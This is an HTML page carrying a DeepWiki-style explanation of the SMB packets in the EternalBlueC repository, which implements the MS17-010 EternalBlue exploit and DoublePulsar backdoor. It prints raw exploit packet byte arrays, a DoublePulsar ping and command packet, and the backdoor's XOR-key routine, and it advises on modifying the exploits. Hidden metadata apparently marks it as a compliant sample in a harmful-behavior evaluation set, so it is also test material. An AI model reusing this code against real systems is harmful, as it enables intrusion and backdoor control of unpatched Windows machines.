<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Eternalblue Packets Generation Code</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }
        .content {
            white-space: pre-wrap;
            word-wrap: break-word;
        }
        .metadata {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="content">Index your code with Devin DeepWiki DeepWiki bhassani/EternalBlueC Index your code with Devin Edit Wiki Share Last indexed: 30 April 2025 ( 65ff98 ) Overview MS17-010 Vulnerability Vulnerability Detection EternalBlue Exploit Exploit Mechanism Kernel Shellcode EternalBlue All-in-One DoublePulsar Backdoor Backdoor Mechanism DLL Upload Functionality EXE Upload Functionality Shellcode Upload Functionality Experimental Features SMB Protocol Implementation SMB Packet Structure Trans2 Packet Manipulation Assembly Components API Resolution Kernel Memory Operations Shellcode Building Tools Menu SMB Packet Structure Relevant source files DoublePulsar_UploadExe.cpp LICENSE README.md images/eternalbluepackets.PNG images/ms17vulnstatus.PNG This document provides a detailed explanation of the SMB (Server Message Block) packet structures used in the EternalBlueC project. It covers the fundamental components of SMB packets, their formats, key fields, and how they are manipulated in the various exploits and tools within the repository. This page focuses specifically on the packet structures themselves; for information about Trans2 packet manipulation techniques used by DoublePulsar, see Trans2 Packet Manipulation . Introduction to SMB Packets Server Message Block (SMB) is a network file sharing protocol that allows applications to read and write files and request services from server programs in a network. In the EternalBlueC project, SMB packets are central to the implementation of the MS17-010 exploit (EternalBlue) and DoublePulsar backdoor operations. The repository contains various packet definitions and manipulation routines that construct, send, and interpret SMB packets to exploit vulnerabilities, check for vulnerable systems, and communicate with the DoublePulsar backdoor. Basic SMB Packet Structure All SMB packets in the codebase follow a standard structure consisting of: Sources: DoublePulsar_UploadExe.cpp 48-84 NetBIOS Header The NetBIOS header is a 4-byte field at the beginning of each SMB packet that specifies the length of the remaining packet (excluding the header itself). In the codebase, this header is typically represented by the first 4 bytes of the packet definitions: Offset Size Description 0 1 byte Protocol identifier (0x00) 1-3 3 bytes Length of the remaining packet Sources: DoublePulsar_UploadExe.cpp 48-49 DoublePulsar_UploadExe.cpp 54-55 DoublePulsar_UploadExe.cpp 62-63 SMB Header The SMB header follows the NetBIOS header and contains critical information about the packet type, status, and other control information. Key fields in the SMB header as used in the codebase: Offset Size Field Description 0-3 4 bytes Protocol Always \xFF SMB (0xFF, 0x53, 0x4D, 0x42) 4 1 byte Command Defines the operation (e.g., 0x72 for negotiate) 5-8 4 bytes Status NT status code for the operation 9 1 byte Flags Various flags 10-11 2 bytes Flags2 Additional flags 12-23 12 bytes Various PID High, Signature, Reserved 24-25 2 bytes TreeID ID for the connected tree 26-27 2 bytes ProcessID Process identifier 28-29 2 bytes UserID User identifier for the session 30-31 2 bytes MultiplexID Used to multiplex operations Sources: DoublePulsar_UploadExe.cpp 48-52 DoublePulsar_UploadExe.cpp 54-60 SMB Parameters and Data Following the header, SMB packets contain command-specific parameters and data. The structure varies depending on the command type. SMB Command Types Used in EternalBlueC The codebase uses several types of SMB packets for different operations: 1. SMB_COM_NEGOTIATE (0x72) Used to establish a session and negotiate protocol dialect. Sources: DoublePulsar_UploadExe.cpp 48-52 2. SMB_COM_SESSION_SETUP_ANDX (0x73) Used to authenticate a user and establish a session. Sources: DoublePulsar_UploadExe.cpp 54-60 3. SMB_COM_TREE_CONNECT_ANDX (0x75) Used to connect to a shared resource (like a file share). Sources: DoublePulsar_UploadExe.cpp 62-65 DoublePulsar_UploadExe.cpp 67 4. SMB_COM_TRANSACTION2 (0x32) Used for various operations, including communication with DoublePulsar. This packet type is particularly important for the exploits in this codebase. Sources: DoublePulsar_UploadExe.cpp 70-76 DoublePulsar_UploadExe.cpp 79-84 Key SMB Packet Implementations in EternalBlueC The repository contains several predefined SMB packet structures used for different purposes: Standard SMB Packets These are used for establishing connections and setting up the environment for exploitation: SmbNegociate : Initiates the SMB connection and negotiates protocol details unsigned char SmbNegociate[] = "\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00" "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" "\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54" "\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00"; Session_Setup_AndX_Request : Authenticates with the server and establishes a session unsigned char Session_Setup_AndX_Request[] = "\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00" "\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" "\x00\x00\xff\xff\x88\x05\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff" "\xff\x02\x00\x88\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" "\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d" "\x62\x00"; SMB_TreeConnectAndX : Connects to a specific share (typically IPC$) unsigned char SMB_TreeConnectAndX[] = "\x00\x00\x00\x5A\xFF\x53\x4D\x42\x75\x00\x00\x00\x00\x18\x07\xC8" "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xFF\xFE" "\x00\x08\x30\x00\x04\xFF\x00\x5A\x00\x08\x00\x01\x00\x2F\x00\x00"; Sources: DoublePulsar_UploadExe.cpp 48-67 DoublePulsar Communication Packets These specialized Trans2 packets are used to check for the presence of DoublePulsar and to communicate with it: trans2_request : Used to ping DoublePulsar to check if it's installed unsigned char trans2_request[] = "\x00\x00\x00\x4E\xFF\x53\x4D\x42\x32\x00\x00\x00\x00\x18\x07\xC0" "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xFF\xFE" "\x00\x08\x41\x00\x0F\x0C\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" "\x00\xA6\xD9\xA4\x00\x00\x00\x0C\x00\x42\x00\x00\x00\x4E\x00\x01" "\x00\x0E\x00\x0D\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" "\x00\x00"; wannacry_Trans2_Request : Used to execute commands via DoublePulsar unsigned char wannacry_Trans2_Request[] = "\x00\x00\x10\x4e\xff\x53\x4d\x42\x32\x00\x00\x00\x00\x18\x07\xc0" "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe" "\x00\x08\x42\x00\x0f\x0c\x00\x00\x10\x01\x00\x00\x00\x00\x00\x00" "\x00\x25\x89\x1a\x00\x00\x00\x0c\x00\x42\x00\x00\x10\x4e\x00\x01" "\x00\x0e\x00\x0d\x10\x00"; These Trans2 packets have special significance in the DoublePulsar communication protocol: The MultiplexID (0x41 in the ping packet) is used to identify the operation The response from an infected system will have a MultiplexID value of the original value + 0x10 The signature field is used to calculate the XOR key for encrypting payloads Sources: DoublePulsar_UploadExe.cpp 70-84 SMB Packet Manipulation in EternalBlueC The repository contains several functions for manipulating SMB packets: 1. TreeID and UserID Updates After establishing a session, the returned TreeID and UserID values must be preserved and used in subsequent packets: From the code: userid = *(WORD*)(recvbuff + 0x20); ... treeid = *(WORD*)(recvbuff + 0x1c); ... memcpy(trans2_request + 28, (unsigned char*)&treeid, 2); memcpy(trans2_request + 32, (unsigned char*)&userid, 2); Sources: DoublePulsar_UploadExe.cpp 424-425 DoublePulsar_UploadExe.cpp 456 DoublePulsar_UploadExe.cpp 458-459 2. SMB Signature Extraction and XOR Key Calculation A critical part of DoublePulsar communication is extracting the SMB signature from responses and using it to calculate an XOR key: From the code: signature[0] = recvbuff[18]; signature[1] = recvbuff[19]; signature[2] = recvbuff[20]; signature[3] = recvbuff[21]; ... sig = LE2INT(signature); ... unsigned int XorKey = ComputeDOUBLEPULSARXorKey(sig); The XOR key is calculated with this algorithm: unsigned int ComputeDOUBLEPULSARXorKey(unsigned int sig) { return 2 * sig ^ ((((sig >> 16) | sig & 0xFF0000) >> 8) | (((sig << 16) | sig & 0xFF00) << 8)); } Sources: DoublePulsar_UploadExe.cpp 467-483 DoublePulsar_UploadExe.cpp 330-334 3. Path Conversion for TreeConnect The codebase includes a function to format paths correctly for SMB TreeConnect requests: void convert_name(char* out, char* name) { unsigned long len; len = strlen(name); out += len * 2 - 1; while (len--) { *out-- = '\x00'; *out-- = name[len]; } } This converts standard paths like \\192.168.0.70\IPC$ to the format required by SMB. Sources: DoublePulsar_UploadExe.cpp 336-345 SMB Packet Sequence in Exploits The SMB packet communication flow in the exploits follows a standard pattern: Sources: README.md 34-82 DoublePulsar_UploadExe.cpp 395-809 Trans2 Session Parameters in DoublePulsar Communication For DoublePulsar communication, the Trans2 packets include specialized parameters in the data section: Offset Size Field Description 0-3 4 bytes TotalSizeOfPayload Total size of the payload to upload 4-7 4 bytes ChunkSize Size of the current chunk (typically 4096) 8-11 4 bytes OffsetOfChunkInPayload Offset of this chunk in the total payload These parameters are XOR encrypted with the same key used for the payload itself. Sources: DoublePulsar_UploadExe.cpp 609-645 Conclusion The SMB packet structures documented in this page form the foundation of the communication protocols used in the EternalBlueC exploits and tools. Understanding these structures is essential for anyone working with or analyzing the codebase, as they represent the core mechanism by which the MS17-010 vulnerability is exploited and the DoublePulsar backdoor is controlled. When implementing or modifying these exploits, careful attention must be paid to the correct formation of these packets, especially the critical fields like TreeID, UserID, and MultiplexID, as well as the proper calculation of the XOR key for DoublePulsar communication. Dismiss Refresh this wiki Enter email to refresh On this page SMB Packet Structure Introduction to SMB Packets Basic SMB Packet Structure NetBIOS Header SMB Header SMB Parameters and Data SMB Command Types Used in EternalBlueC 1. SMB_COM_NEGOTIATE (0x72) 2. SMB_COM_SESSION_SETUP_ANDX (0x73) 3. SMB_COM_TREE_CONNECT_ANDX (0x75) 4. SMB_COM_TRANSACTION2 (0x32) Key SMB Packet Implementations in EternalBlueC Standard SMB Packets DoublePulsar Communication Packets SMB Packet Manipulation in EternalBlueC 1. TreeID and UserID Updates 2. SMB Signature Extraction and XOR Key Calculation 3. Path Conversion for TreeConnect SMB Packet Sequence in Exploits Trans2 Session Parameters in DoublePulsar Communication Conclusion</div>
    </div>
    <!-- Metadata for experiment tracking -->
    <div class="metadata" data-behavior="eternalblue_packets_generation_code" data-stance="1" data-type="explicit" data-dataset="validation"></div>
</body>
</html>
